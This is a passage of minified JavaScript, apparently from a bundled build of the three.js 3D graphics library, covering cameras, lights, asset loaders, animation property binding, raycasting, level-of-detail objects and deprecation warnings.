            toJSON(e) { const t = _t.prototype.toJSON.call(this, e); return t.object.zoom = this.zoom, t.object.left = this.left, t.object.right = this.right, t.object.top = this.top, t.object.bottom = this.bottom, t.object.near = this.near, t.object.far = this.far, null !== this.view && (t.object.view = Object.assign({}, this.view)), t }
        }
        Do.prototype.isOrthographicCamera = !0;
        class No extends To { constructor() { super(new Do(-5, 5, 5, -5, .5, 500)) } }
        No.prototype.isDirectionalLightShadow = !0;
        class Io extends _o {
            constructor(e, t) { super(e, t), this.type = "DirectionalLight", this.position.copy(_t.DefaultUp), this.updateMatrix(), this.target = new _t, this.shadow = new No }
            copy(e) { return super.copy(e), this.target = e.target.clone(), this.shadow = e.shadow.clone(), this }
        }
        Io.prototype.isDirectionalLight = !0;
        class Oo extends _o { constructor(e, t) { super(e, t), this.type = "AmbientLight" } }
        Oo.prototype.isAmbientLight = !0;
        const Ho = function(e) { if ("undefined" != typeof TextDecoder) return (new TextDecoder).decode(e); let t = ""; for (let n = 0, i = e.length; n < i; n++) t += String.fromCharCode(e[n]); try { return decodeURIComponent(escape(t)) } catch (e) { return t } },
            Uo = function(e) { const t = e.lastIndexOf("/"); return -1 === t ? "./" : e.substr(0, t + 1) };

        function Fo() { fn.call(this), this.type = "InstancedBufferGeometry", this.instanceCount = 1 / 0 }

        function zo(e, t, n, i) { "number" == typeof n && (i = n, n = !1, console.error("THREE.InstancedBufferAttribute: The constructor now expects normalized as the third argument.")), Yt.call(this, e, t, n), this.meshPerAttribute = i || 1 }

        function Bo(e) { "undefined" == typeof createImageBitmap && console.warn("THREE.ImageBitmapLoader: createImageBitmap() not supported."), "undefined" == typeof fetch && console.warn("THREE.ImageBitmapLoader: fetch() not supported."), uo.call(this, e), this.options = { premultiplyAlpha: "none" } }
        let Go;
        Fo.prototype = Object.assign(Object.create(fn.prototype), { constructor: Fo, isInstancedBufferGeometry: !0, copy: function(e) { return fn.prototype.copy.call(this, e), this.instanceCount = e.instanceCount, this }, clone: function() { return (new this.constructor).copy(this) }, toJSON: function() { const e = fn.prototype.toJSON.call(this); return e.instanceCount = this.instanceCount, e.isInstancedBufferGeometry = !0, e } }), zo.prototype = Object.assign(Object.create(Yt.prototype), { constructor: zo, isInstancedBufferAttribute: !0, copy: function(e) { return Yt.prototype.copy.call(this, e), this.meshPerAttribute = e.meshPerAttribute, this }, toJSON: function() { const e = Yt.prototype.toJSON.call(this); return e.meshPerAttribute = this.meshPerAttribute, e.isInstancedBufferAttribute = !0, e } }), Bo.prototype = Object.assign(Object.create(uo.prototype), {
            constructor: Bo,
            isImageBitmapLoader: !0,
            setOptions: function(e) { return this.options = e, this },
            load: function(e, t, n, i) {
                void 0 === e && (e = ""), void 0 !== this.path && (e = this.path + e), e = this.manager.resolveURL(e);
                const r = this,
                    a = lo.get(e);
                if (void 0 !== a) return r.manager.itemStart(e), setTimeout((function() { t && t(a), r.manager.itemEnd(e) }), 0), a;
                const o = {};
                o.credentials = "anonymous" === this.crossOrigin ? "same-origin" : "include", o.headers = this.requestHeader, fetch(e, o).then((function(e) { return e.blob() })).then((function(e) { return createImageBitmap(e, Object.assign(r.options, { colorSpaceConversion: "none" })) })).then((function(n) { lo.add(e, n), t && t(n), r.manager.itemEnd(e) })).catch((function(t) { i && i(t), r.manager.itemError(e), r.manager.itemEnd(e) })), r.manager.itemStart(e)
            }
        });
        class Vo extends uo {
            constructor(e) { super(e) }
            load(e, t, n, i) {
                const r = this,
                    a = new po(this.manager);
                a.setResponseType("arraybuffer"), a.setPath(this.path), a.setRequestHeader(this.requestHeader), a.setWithCredentials(this.withCredentials), a.load(e, (function(n) {
                    try {
                        const e = n.slice(0);
                        (void 0 === Go && (Go = new(window.AudioContext || window.webkitAudioContext)), Go).decodeAudioData(e, (function(e) { t(e) }))
                    } catch (t) { i ? i(t) : console.error(t), r.manager.itemError(e) }
                }), n, i)
            }
        }
        new Ze, new Ze;
        const jo = new RegExp("[\\[\\]\\.:\\/]", "g"),
            qo = "[^\\[\\]\\.:\\/]",
            Xo = "[^" + "\\[\\]\\.:\\/".replace("\\.", "") + "]",
            Yo = /((?:WC+[\/:])*)/.source.replace("WC", qo),
            Zo = /(WCOD+)?/.source.replace("WCOD", Xo),
            Jo = /(?:\.(WC+)(?:\[(.+)\])?)?/.source.replace("WC", qo),
            Ko = /\.(WC+)(?:\[(.+)\])?/.source.replace("WC", qo),
            $o = new RegExp("^" + Yo + Zo + Jo + Ko + "$"),
            Qo = ["material", "materials", "bones"];

        function es(e, t, n) {
            const i = n || ts.parseTrackName(t);
            this._targetGroup = e, this._bindings = e.subscribe_(t, i)
        }

        function ts(e, t, n) { this.path = t, this.parsedPath = n || ts.parseTrackName(t), this.node = ts.findNode(e, this.parsedPath.nodeName) || e, this.rootNode = e }
        Object.assign(es.prototype, {
            getValue: function(e, t) {
                this.bind();
                const n = this._targetGroup.nCachedObjects_,
                    i = this._bindings[n];
                void 0 !== i && i.getValue(e, t)
            },
            setValue: function(e, t) { const n = this._bindings; for (let i = this._targetGroup.nCachedObjects_, r = n.length; i !== r; ++i) n[i].setValue(e, t) },
            bind: function() { const e = this._bindings; for (let t = this._targetGroup.nCachedObjects_, n = e.length; t !== n; ++t) e[t].bind() },
            unbind: function() { const e = this._bindings; for (let t = this._targetGroup.nCachedObjects_, n = e.length; t !== n; ++t) e[t].unbind() }
        }), Object.assign(ts, {
            Composite: es,
            create: function(e, t, n) { return e && e.isAnimationObjectGroup ? new ts.Composite(e, t, n) : new ts(e, t, n) },
            sanitizeNodeName: function(e) { return e.replace(/\s/g, "_").replace(jo, "") },
            parseTrackName: function(e) {
                const t = $o.exec(e);
                if (!t) throw new Error("PropertyBinding: Cannot parse trackName: " + e);
                const n = { nodeName: t[2], objectName: t[3], objectIndex: t[4], propertyName: t[5], propertyIndex: t[6] },
                    i = n.nodeName && n.nodeName.lastIndexOf(".");
                if (void 0 !== i && -1 !== i) { const e = n.nodeName.substring(i + 1); - 1 !== Qo.indexOf(e) && (n.nodeName = n.nodeName.substring(0, i), n.objectName = e) }
                if (null === n.propertyName || 0 === n.propertyName.length) throw new Error("PropertyBinding: can not parse propertyName from trackName: " + e);
                return n
            },
            findNode: function(e, t) {
                if (!t || "" === t || "." === t || -1 === t || t === e.name || t === e.uuid) return e;
                if (e.skeleton) { const n = e.skeleton.getBoneByName(t); if (void 0 !== n) return n }
                if (e.children) {
                    const n = function(e) { for (let i = 0; i < e.length; i++) { const r = e[i]; if (r.name === t || r.uuid === t) return r; const a = n(r.children); if (a) return a } return null },
                        i = n(e.children);
                    if (i) return i
                }
                return null
            }
        }), Object.assign(ts.prototype, {
            _getValue_unavailable: function() {},
            _setValue_unavailable: function() {},
            BindingType: { Direct: 0, EntireArray: 1, ArrayElement: 2, HasFromToArray: 3 },
            Versioning: { None: 0, NeedsUpdate: 1, MatrixWorldNeedsUpdate: 2 },
            GetterByBindingType: [function(e, t) { e[t] = this.node[this.propertyName] }, function(e, t) { const n = this.resolvedProperty; for (let i = 0, r = n.length; i !== r; ++i) e[t++] = n[i] }, function(e, t) { e[t] = this.resolvedProperty[this.propertyIndex] }, function(e, t) { this.resolvedProperty.toArray(e, t) }],
            SetterByBindingTypeAndVersioning: [
                [function(e, t) { this.targetObject[this.propertyName] = e[t] }, function(e, t) { this.targetObject[this.propertyName] = e[t], this.targetObject.needsUpdate = !0 }, function(e, t) { this.targetObject[this.propertyName] = e[t], this.targetObject.matrixWorldNeedsUpdate = !0 }],
                [function(e, t) { const n = this.resolvedProperty; for (let i = 0, r = n.length; i !== r; ++i) n[i] = e[t++] }, function(e, t) {
                    const n = this.resolvedProperty;
                    for (let i = 0, r = n.length; i !== r; ++i) n[i] = e[t++];
                    this.targetObject.needsUpdate = !0
                }, function(e, t) {
                    const n = this.resolvedProperty;
                    for (let i = 0, r = n.length; i !== r; ++i) n[i] = e[t++];
                    this.targetObject.matrixWorldNeedsUpdate = !0
                }],
                [function(e, t) { this.resolvedProperty[this.propertyIndex] = e[t] }, function(e, t) { this.resolvedProperty[this.propertyIndex] = e[t], this.targetObject.needsUpdate = !0 }, function(e, t) { this.resolvedProperty[this.propertyIndex] = e[t], this.targetObject.matrixWorldNeedsUpdate = !0 }],
                [function(e, t) { this.resolvedProperty.fromArray(e, t) }, function(e, t) { this.resolvedProperty.fromArray(e, t), this.targetObject.needsUpdate = !0 }, function(e, t) { this.resolvedProperty.fromArray(e, t), this.targetObject.matrixWorldNeedsUpdate = !0 }]
            ],
            getValue: function(e, t) { this.bind(), this.getValue(e, t) },
            setValue: function(e, t) { this.bind(), this.setValue(e, t) },
            bind: function() {
                let e = this.node;
                const t = this.parsedPath,
                    n = t.objectName,
                    i = t.propertyName;
                let r = t.propertyIndex;
                if (e || (e = ts.findNode(this.rootNode, t.nodeName) || this.rootNode, this.node = e), this.getValue = this._getValue_unavailable, this.setValue = this._setValue_unavailable, !e) return void console.error("THREE.PropertyBinding: Trying to update node for track: " + this.path + " but it wasn't found.");
                if (n) {
                    let i = t.objectIndex;
                    switch (n) {
                        case "materials":
                            if (!e.material) return void console.error("THREE.PropertyBinding: Can not bind to material as node does not have a material.", this);
                            if (!e.material.materials) return void console.error("THREE.PropertyBinding: Can not bind to material.materials as node.material does not have a materials array.", this);
                            e = e.material.materials;
                            break;
                        case "bones":
                            if (!e.skeleton) return void console.error("THREE.PropertyBinding: Can not bind to bones as node does not have a skeleton.", this);
                            e = e.skeleton.bones;
                            for (let t = 0; t < e.length; t++)
                                if (e[t].name === i) { i = t; break }
                            break;
                        default:
                            if (void 0 === e[n]) return void console.error("THREE.PropertyBinding: Can not bind to objectName of node undefined.", this);
                            e = e[n]
                    }
                    if (void 0 !== i) {
                        if (void 0 === e[i]) return void console.error("THREE.PropertyBinding: Trying to bind to objectIndex of objectName, but is undefined.", this, e);
                        e = e[i]
                    }
                }
                const a = e[i];
                if (void 0 === a) { const n = t.nodeName; return void console.error("THREE.PropertyBinding: Trying to update property for track: " + n + "." + i + " but it wasn't found.", e) }
                let o = this.Versioning.None;
                this.targetObject = e, void 0 !== e.needsUpdate ? o = this.Versioning.NeedsUpdate : void 0 !== e.matrixWorldNeedsUpdate && (o = this.Versioning.MatrixWorldNeedsUpdate);
                let s = this.BindingType.Direct;
                if (void 0 !== r) {
                    if ("morphTargetInfluences" === i) {
                        if (!e.geometry) return void console.error("THREE.PropertyBinding: Can not bind to morphTargetInfluences because node does not have a geometry.", this);
                        if (!e.geometry.isBufferGeometry) return void console.error("THREE.PropertyBinding: Can not bind to morphTargetInfluences on THREE.Geometry. Use THREE.BufferGeometry instead.", this);
                        if (!e.geometry.morphAttributes) return void console.error("THREE.PropertyBinding: Can not bind to morphTargetInfluences because node does not have a geometry.morphAttributes.", this);
                        void 0 !== e.morphTargetDictionary[r] && (r = e.morphTargetDictionary[r])
                    }
                    s = this.BindingType.ArrayElement, this.resolvedProperty = a, this.propertyIndex = r
                } else void 0 !== a.fromArray && void 0 !== a.toArray ? (s = this.BindingType.HasFromToArray, this.resolvedProperty = a) : Array.isArray(a) ? (s = this.BindingType.EntireArray, this.resolvedProperty = a) : this.propertyName = i;
                this.getValue = this.GetterByBindingType[s], this.setValue = this.SetterByBindingTypeAndVersioning[s][o]
            },
            unbind: function() { this.node = null, this.getValue = this._getValue_unbound, this.setValue = this._setValue_unbound }
        }), Object.assign(ts.prototype, { _getValue_unbound: ts.prototype.getValue, _setValue_unbound: ts.prototype.setValue });
        class ns {
            constructor(e) { "string" == typeof e && (console.warn("THREE.Uniform: Type parameter is no longer needed."), e = arguments[1]), this.value = e }
            clone() { return new ns(void 0 === this.value.clone ? this.value : this.value.clone()) }
        }

        function is(e, t, n) { ia.call(this, e, t), this.meshPerAttribute = n || 1 }

        function rs(e, t, n, i, r) { this.buffer = e, this.type = t, this.itemSize = n, this.elementSize = i, this.count = r, this.version = 0 }

        function as(e, t, n = 0, i = 1 / 0) { this.ray = new Ye(e, t), this.near = n, this.far = i, this.camera = null, this.layers = new ot, this.params = { Mesh: {}, Line: { threshold: 1 }, LOD: {}, Points: { threshold: 1 }, Sprite: {} }, Object.defineProperties(this.params, { PointCloud: { get: function() { return console.warn("THREE.Raycaster: params.PointCloud has been renamed to params.Points."), this.Points } } }) }

        function os(e, t) { return e.distance - t.distance }

        function ss(e, t, n, i) { if (e.layers.test(t.layers) && e.raycast(t, n), !0 === i) { const i = e.children; for (let e = 0, r = i.length; e < r; e++) ss(i[e], t, n, !0) } }

        function ls(e) { _t.call(this), this.material = e, this.render = function() {}, this.hasPositions = !1, this.hasNormals = !1, this.hasColors = !1, this.hasUvs = !1, this.positionArray = null, this.normalArray = null, this.colorArray = null, this.uvArray = null, this.count = 0 }
        is.prototype = Object.assign(Object.create(ia.prototype), { constructor: is, isInstancedInterleavedBuffer: !0, copy: function(e) { return ia.prototype.copy.call(this, e), this.meshPerAttribute = e.meshPerAttribute, this }, clone: function(e) { const t = ia.prototype.clone.call(this, e); return t.meshPerAttribute = this.meshPerAttribute, t }, toJSON: function(e) { const t = ia.prototype.toJSON.call(this, e); return t.isInstancedInterleavedBuffer = !0, t.meshPerAttribute = this.meshPerAttribute, t } }), Object.defineProperty(rs.prototype, "needsUpdate", { set: function(e) {!0 === e && this.version++ } }), Object.assign(rs.prototype, { isGLBufferAttribute: !0, setBuffer: function(e) { return this.buffer = e, this }, setType: function(e, t) { return this.type = e, this.elementSize = t, this }, setItemSize: function(e) { return this.itemSize = e, this }, setCount: function(e) { return this.count = e, this } }), Object.assign(as.prototype, { set: function(e, t) { this.ray.set(e, t) }, setFromCamera: function(e, t) { t && t.isPerspectiveCamera ? (this.ray.origin.setFromMatrixPosition(t.matrixWorld), this.ray.direction.set(e.x, e.y, .5).unproject(t).sub(this.ray.origin).normalize(), this.camera = t) : t && t.isOrthographicCamera ? (this.ray.origin.set(e.x, e.y, (t.near + t.far) / (t.near - t.far)).unproject(t), this.ray.direction.set(0, 0, -1).transformDirection(t.matrixWorld), this.camera = t) : console.error("THREE.Raycaster: Unsupported camera type: " + t.type) }, intersectObject: function(e, t = !1, n = []) { return ss(e, this, n, t), n.sort(os), n }, intersectObjects: function(e, t = !1, n = []) { for (let i = 0, r = e.length; i < r; i++) ss(e[i], this, n, t); return n.sort(os), n } }), ls.prototype = Object.create(_t.prototype), ls.prototype.constructor = ls, ls.prototype.isImmediateRenderObject = !0;
        const cs = new jt({ side: 1, depthWrite: !1, depthTest: !1 });
        new Dn(new In, cs), xo.create = function(e, t) { return console.log("THREE.Curve.create() has been deprecated"), e.prototype = Object.create(xo.prototype), e.prototype.constructor = e, e.prototype.getPoint = t, e }, uo.prototype.extractUrlBase = function(e) { return console.warn("THREE.Loader: .extractUrlBase() has been deprecated. Use THREE.LoaderUtils.extractUrlBase() instead."), Uo(e) }, uo.Handlers = { add: function() { console.error("THREE.Loader: Handlers.add() has been removed. Use LoadingManager.addHandler() instead.") }, get: function() { console.error("THREE.Loader: Handlers.get() has been removed. Use LoadingManager.getHandler() instead.") } }, Te.prototype.center = function(e) { return console.warn("THREE.Box3: .center() has been renamed to .getCenter()."), this.getCenter(e) }, Te.prototype.empty = function() { return console.warn("THREE.Box3: .empty() has been renamed to .isEmpty()."), this.isEmpty() }, Te.prototype.isIntersectionBox = function(e) { return console.warn("THREE.Box3: .isIntersectionBox() has been renamed to .intersectsBox()."), this.intersectsBox(e) }, Te.prototype.isIntersectionSphere = function(e) { return console.warn("THREE.Box3: .isIntersectionSphere() has been renamed to .intersectsSphere()."), this.intersectsSphere(e) }, Te.prototype.size = function(e) { return console.warn("THREE.Box3: .size() has been renamed to .getSize()."), this.getSize(e) }, Be.prototype.empty = function() { return console.warn("THREE.Sphere: .empty() has been renamed to .isEmpty()."), this.isEmpty() }, Yn.prototype.setFromMatrix = function(e) { return console.warn("THREE.Frustum: .setFromMatrix() has been renamed to .setFromProjectionMatrix()."), this.setFromProjectionMatrix(e) }, ue.random16 = function() { return console.warn("THREE.Math: .random16() has been deprecated. Use Math.random() instead."), Math.random() }, ue.nearestPowerOfTwo = function(e) { return console.warn("THREE.Math: .nearestPowerOfTwo() has been renamed to .floorPowerOfTwo()."), ue.floorPowerOfTwo(e) }, ue.nextPowerOfTwo = function(e) { return console.warn("THREE.Math: .nextPowerOfTwo() has been renamed to .ceilPowerOfTwo()."), ue.ceilPowerOfTwo(e) }, de.prototype.flattenToArrayOffset = function(e, t) { return console.warn("THREE.Matrix3: .flattenToArrayOffset() has been deprecated. Use .toArray() instead."), this.toArray(e, t) }, de.prototype.multiplyVector3 = function(e) { return console.warn("THREE.Matrix3: .multiplyVector3() has been removed. Use vector.applyMatrix3( matrix ) instead."), e.applyMatrix3(this) }, de.prototype.multiplyVector3Array = function() { console.error("THREE.Matrix3: .multiplyVector3Array() has been removed.") }, de.prototype.applyToBufferAttribute = function(e) { return console.warn("THREE.Matrix3: .applyToBufferAttribute() has been removed. Use attribute.applyMatrix3( matrix ) instead."), e.applyMatrix3(this) }, de.prototype.applyToVector3Array = function() { console.error("THREE.Matrix3: .applyToVector3Array() has been removed.") }, de.prototype.getInverse = function(e) { return console.warn("THREE.Matrix3: .getInverse() has been removed. Use matrixInv.copy( matrix ).invert(); instead."), this.copy(e).invert() }, Ze.prototype.extractPosition = function(e) { return console.warn("THREE.Matrix4: .extractPosition() has been renamed to .copyPosition()."), this.copyPosition(e) }, Ze.prototype.flattenToArrayOffset = function(e, t) { return console.warn("THREE.Matrix4: .flattenToArrayOffset() has been deprecated. Use .toArray() instead."), this.toArray(e, t) }, Ze.prototype.getPosition = function() { return console.warn("THREE.Matrix4: .getPosition() has been removed. Use Vector3.setFromMatrixPosition( matrix ) instead."), (new be).setFromMatrixColumn(this, 3) }, Ze.prototype.setRotationFromQuaternion = function(e) { return console.warn("THREE.Matrix4: .setRotationFromQuaternion() has been renamed to .makeRotationFromQuaternion()."), this.makeRotationFromQuaternion(e) }, Ze.prototype.multiplyToArray = function() { console.warn("THREE.Matrix4: .multiplyToArray() has been removed.") }, Ze.prototype.multiplyVector3 = function(e) { return console.warn("THREE.Matrix4: .multiplyVector3() has been removed. Use vector.applyMatrix4( matrix ) instead."), e.applyMatrix4(this) }, Ze.prototype.multiplyVector4 = function(e) { return console.warn("THREE.Matrix4: .multiplyVector4() has been removed. Use vector.applyMatrix4( matrix ) instead."), e.applyMatrix4(this) }, Ze.prototype.multiplyVector3Array = function() { console.error("THREE.Matrix4: .multiplyVector3Array() has been removed.") }, Ze.prototype.rotateAxis = function(e) { console.warn("THREE.Matrix4: .rotateAxis() has been removed. Use Vector3.transformDirection( matrix ) instead."), e.transformDirection(this) }, Ze.prototype.crossVector = function(e) { return console.warn("THREE.Matrix4: .crossVector() has been removed. Use vector.applyMatrix4( matrix ) instead."), e.applyMatrix4(this) }, Ze.prototype.translate = function() { console.error("THREE.Matrix4: .translate() has been removed.") }, Ze.prototype.rotateX = function() { console.error("THREE.Matrix4: .rotateX() has been removed.") }, Ze.prototype.rotateY = function() { console.error("THREE.Matrix4: .rotateY() has been removed.") }, Ze.prototype.rotateZ = function() { console.error("THREE.Matrix4: .rotateZ() has been removed.") }, Ze.prototype.rotateByAxis = function() { console.error("THREE.Matrix4: .rotateByAxis() has been removed.") }, Ze.prototype.applyToBufferAttribute = function(e) { return console.warn("THREE.Matrix4: .applyToBufferAttribute() has been removed. Use attribute.applyMatrix4( matrix ) instead."), e.applyMatrix4(this) }, Ze.prototype.applyToVector3Array = function() { console.error("THREE.Matrix4: .applyToVector3Array() has been removed.") }, Ze.prototype.makeFrustum = function(e, t, n, i, r, a) { return console.warn("THREE.Matrix4: .makeFrustum() has been removed. Use .makePerspective( left, right, top, bottom, near, far ) instead."), this.makePerspective(e, t, i, n, r, a) }, Ze.prototype.getInverse = function(e) { return console.warn("THREE.Matrix4: .getInverse() has been removed. Use matrixInv.copy( matrix ).invert(); instead."), this.copy(e).invert() }, Tt.prototype.isIntersectionLine = function(e) { return console.warn("THREE.Plane: .isIntersectionLine() has been renamed to .intersectsLine()."), this.intersectsLine(e) }, _e.prototype.multiplyVector3 = function(e) { return console.warn("THREE.Quaternion: .multiplyVector3() has been removed. Use is now vector.applyQuaternion( quaternion ) instead."), e.applyQuaternion(this) }, _e.prototype.inverse = function() { return console.warn("THREE.Quaternion: .inverse() has been renamed to invert()."), this.invert() }, Ye.prototype.isIntersectionBox = function(e) { return console.warn("THREE.Ray: .isIntersectionBox() has been renamed to .intersectsBox()."), this.intersectsBox(e) }, Ye.prototype.isIntersectionPlane = function(e) { return console.warn("THREE.Ray: .isIntersectionPlane() has been renamed to .intersectsPlane()."), this.intersectsPlane(e) }, Ye.prototype.isIntersectionSphere = function(e) { return console.warn("THREE.Ray: .isIntersectionSphere() has been renamed to .intersectsSphere()."), this.intersectsSphere(e) }, Ot.prototype.area = function() { return console.warn("THREE.Triangle: .area() has been renamed to .getArea()."), this.getArea() }, Ot.prototype.barycoordFromPoint = function(e, t) { return console.warn("THREE.Triangle: .barycoordFromPoint() has been renamed to .getBarycoord()."), this.getBarycoord(e, t) }, Ot.prototype.midpoint = function(e) { return console.warn("THREE.Triangle: .midpoint() has been renamed to .getMidpoint()."), this.getMidpoint(e) }, Ot.prototypenormal = function(e) { return console.warn("THREE.Triangle: .normal() has been renamed to .getNormal()."), this.getNormal(e) }, Ot.prototype.plane = function(e) { return console.warn("THREE.Triangle: .plane() has been renamed to .getPlane()."), this.getPlane(e) }, Ot.barycoordFromPoint = function(e, t, n, i, r) { return console.warn("THREE.Triangle: .barycoordFromPoint() has been renamed to .getBarycoord()."), Ot.getBarycoord(e, t, n, i, r) }, Ot.normal = function(e, t, n, i) { return console.warn("THREE.Triangle: .normal() has been renamed to .getNormal()."), Ot.getNormal(e, t, n, i) }, he.prototype.fromAttribute = function(e, t, n) { return console.warn("THREE.Vector2: .fromAttribute() has been renamed to .fromBufferAttribute()."), this.fromBufferAttribute(e, t, n) }, he.prototype.distanceToManhattan = function(e) { return console.warn("THREE.Vector2: .distanceToManhattan() has been renamed to .manhattanDistanceTo()."), this.manhattanDistanceTo(e) }, he.prototype.lengthManhattan = function() { return console.warn("THREE.Vector2: .lengthManhattan() has been renamed to .manhattanLength()."), this.manhattanLength() }, be.prototype.setEulerFromRotationMatrix = function() { console.error("THREE.Vector3: .setEulerFromRotationMatrix() has been removed. Use Euler.setFromRotationMatrix() instead.") }, be.prototype.setEulerFromQuaternion = function() { console.error("THREE.Vector3: .setEulerFromQuaternion() has been removed. Use Euler.setFromQuaternion() instead.") }, be.prototype.getPositionFromMatrix = function(e) { return console.warn("THREE.Vector3: .getPositionFromMatrix() has been renamed to .setFromMatrixPosition()."), this.setFromMatrixPosition(e) }, be.prototype.getScaleFromMatrix = function(e) { return console.warn("THREE.Vector3: .getScaleFromMatrix() has been renamed to .setFromMatrixScale()."), this.setFromMatrixScale(e) }, be.prototype.getColumnFromMatrix = function(e, t) { return console.warn("THREE.Vector3: .getColumnFromMatrix() has been renamed to .setFromMatrixColumn()."), this.setFromMatrixColumn(t, e) }, be.prototype.applyProjection = function(e) { return console.warn("THREE.Vector3: .applyProjection() has been removed. Use .applyMatrix4( m ) instead."), this.applyMatrix4(e) }, be.prototype.fromAttribute = function(e, t, n) { return console.warn("THREE.Vector3: .fromAttribute() has been renamed to .fromBufferAttribute()."), this.fromBufferAttribute(e, t, n) }, be.prototype.distanceToManhattan = function(e) { return console.warn("THREE.Vector3: .distanceToManhattan() has been renamed to .manhattanDistanceTo()."), this.manhattanDistanceTo(e) }, be.prototype.lengthManhattan = function() { return console.warn("THREE.Vector3: .lengthManhattan() has been renamed to .manhattanLength()."), this.manhattanLength() }, ye.prototype.fromAttribute = function(e, t, n) { return console.warn("THREE.Vector4: .fromAttribute() has been renamed to .fromBufferAttribute()."), this.fromBufferAttribute(e, t, n) }, ye.prototype.lengthManhattan = function() { return console.warn("THREE.Vector4: .lengthManhattan() has been renamed to .manhattanLength()."), this.manhattanLength() }, _t.prototype.getChildByName = function(e) { return console.warn("THREE.Object3D: .getChildByName() has been renamed to .getObjectByName()."), this.getObjectByName(e) }, _t.prototype.renderDepth = function() { console.warn("THREE.Object3D: .renderDepth has been removed. Use .renderOrder, instead.") }, _t.prototype.translate = function(e, t) { return console.warn("THREE.Object3D: .translate() has been removed. Use .translateOnAxis( axis, distance ) instead."), this.translateOnAxis(t, e) }, _t.prototype.getWorldRotation = function() { console.error("THREE.Object3D: .getWorldRotation() has been removed. Use THREE.Object3D.getWorldQuaternion( target ) instead.") }, _t.prototype.applyMatrix = function(e) { return console.warn("THREE.Object3D: .applyMatrix() has been renamed to .applyMatrix4()."), this.applyMatrix4(e) }, Object.defineProperties(_t.prototype, { eulerOrder: { get: function() { return console.warn("THREE.Object3D: .eulerOrder is now .rotation.order."), this.rotation.order }, set: function(e) { console.warn("THREE.Object3D: .eulerOrder is now .rotation.order."), this.rotation.order = e } }, useQuaternion: { get: function() { console.warn("THREE.Object3D: .useQuaternion has been removed. The library now uses quaternions by default.") }, set: function() { console.warn("THREE.Object3D: .useQuaternion has been removed. The library now uses quaternions by default.") } } }), Dn.prototype.setDrawMode = function() { console.error("THREE.Mesh: .setDrawMode() has been removed. The renderer now always assumes THREE.TrianglesDrawMode. Transform your geometry via BufferGeometryUtils.toTrianglesDrawMode() if necessary.") }, Object.defineProperties(Dn.prototype, { drawMode: { get: function() { return console.error("THREE.Mesh: .drawMode has been removed. The renderer now always assumes THREE.TrianglesDrawMode."), 0 }, set: function() { console.error("THREE.Mesh: .drawMode has been removed. The renderer now always assumes THREE.TrianglesDrawMode. Transform your geometry via BufferGeometryUtils.toTrianglesDrawMode() if necessary.") } } }), Object.defineProperties(class extends _t {
            constructor() { super(), this._currentLevel = 0, this.type = "LOD", Object.defineProperties(this, { levels: { enumerable: !0, value: [] }, isLOD: { value: !0 } }), this.autoUpdate = !0 }
            copy(e) {
                super.copy(e, !1);
                const t = e.levels;
                for (let e = 0, n = t.length; e < n; e++) {
                    const n = t[e];
                    this.addLevel(n.object.clone(), n.distance)
                }
                return this.autoUpdate = e.autoUpdate, this
            }
            addLevel(e, t = 0) { t = Math.abs(t); const n = this.levels; let i; for (i = 0; i < n.length && !(t < n[i].distance); i++); return n.splice(i, 0, { distance: t, object: e }), this.add(e), this }
            getCurrentLevel() { return this._currentLevel }
            getObjectForDistance(e) { const t = this.levels; if (t.length > 0) { let n, i; for (n = 1, i = t.length; n < i && !(e < t[n].distance); n++); return t[n - 1].object } return null }
            raycast(e, t) {
                if (this.levels.length > 0) {
                    oa.setFromMatrixPosition(this.matrixWorld);
                    const n = e.ray.origin.distanceTo(oa);
                    this.getObjectForDistance(n).raycast(e, t)
                }
            }
            update(e) { const t = this.levels; if (t.length > 1) { oa.setFromMatrixPosition(e.matrixWorld), sa.setFromMatrixPosition(this.matrixWorld); const n = oa.distanceTo(sa) / e.zoom; let i, r; for (t[0].object.visible = !0, i = 1, r = t.length; i < r && n >= t[i].distance; i++) t[i - 1].object.visible = !1, t[i].object.visible = !0; for (this._currentLevel = i - 1; i < r; i++) t[i].object.visible = !1 } }
            toJSON(e) {
                const t = super.toJSON(e);
                !1 === this.autoUpdate && (t.object.autoUpdate = !1), t.object.levels = [];
                const n = this.levels;
                for (let e = 0, i = n.length; e < i; e++) {
                    const i = n[e];
                    t.object.levels.push({ object: i.object.uuid, distance: i.distance })
                }
                return t
            }
        }.prototype, { objects: { get: function() { return console.warn("THREE.LOD: .objects has been renamed to .levels."), this.levels } } }), Object.defineProperty(va.prototype, "useVertexTexture", { get: function() { console.warn("THREE.Skeleton: useVertexTexture has been removed.") }, set: function() { console.warn("THREE.Skeleton: useVertexTexture has been removed.") } }), pa.prototype.initBones = function() { console.error("THREE.SkinnedMesh: initBones() has been removed.") }, Object.defineProperty(xo.prototype, "__arcLengthDivisions", { get: function() { return console.warn("THREE.Curve: .__arcLengthDivisions is now .arcLengthDivisions."), this.arcLengthDivisions }, set: function(e) { console.warn("THREE.Curve: .__arcLengthDivisions is now .arcLengthDivisions."), this.arcLengthDivisions = e } }), Bn.prototype.setLens = function(e, t) { console.warn("THREE.PerspectiveCamera.setLens is deprecated. Use .setFocalLength and .filmGauge for a photographic setup."), void 0 !== t && (this.filmGauge = t), this.setFocalLength(e) }, Object.defineProperties(_o.prototype, { onlyShadow: { set: function() { console.warn("THREE.Light: .onlyShadow has been removed.") } }, shadowCameraFov: { set: function(e) { console.warn("THREE.Light: .shadowCameraFov is now .shadow.camera.fov."), this.shadow.camera.fov = e } }, shadowCameraLeft: { set: function(e) { console.warn("THREE.Light: .shadowCameraLeft is now .shadow.camera.left."), this.shadow.camera.left = e } }, shadowCameraRight: { set: function(e) { console.warn("THREE.Light: .shadowCameraRight is now .shadow.camera.right."), this.shadow.camera.right = e } }, shadowCameraTop: { set: function(e) { console.warn("THREE.Light: .shadowCameraTop is now .shadow.camera.top."), this.shadow.camera.top = e } }, shadowCameraBottom: { set: function(e) { console.warn("THREE.Light: .shadowCameraBottom is now .shadow.camera.bottom."), this.shadow.camera.bottom = e } }, shadowCameraNear: { set: function(e) { console.warn("THREE.Light: .shadowCameraNear is now .shadow.camera.near."), this.shadow.camera.near = e } }, shadowCameraFar: { set: function(e) { console.warn("THREE.Light: .shadowCameraFar is now .shadow.camera.far."), this.shadow.camera.far = e } }, shadowCameraVisible: { set: function() { console.warn("THREE.Light: .shadowCameraVisible has been removed. Use new THREE.CameraHelper( light.shadow.camera ) instead.") } }, shadowBias: { set: function(e) { console.warn("THREE.Light: .shadowBias is now .shadow.bias."), this.shadow.bias = e } }, shadowDarkness: { set: function() { console.warn("THREE.Light: .shadowDarkness has been removed.") } }, shadowMapWidth: { set: function(e) { console.warn("THREE.Light: .shadowMapWidth is now .shadow.mapSize.width."), 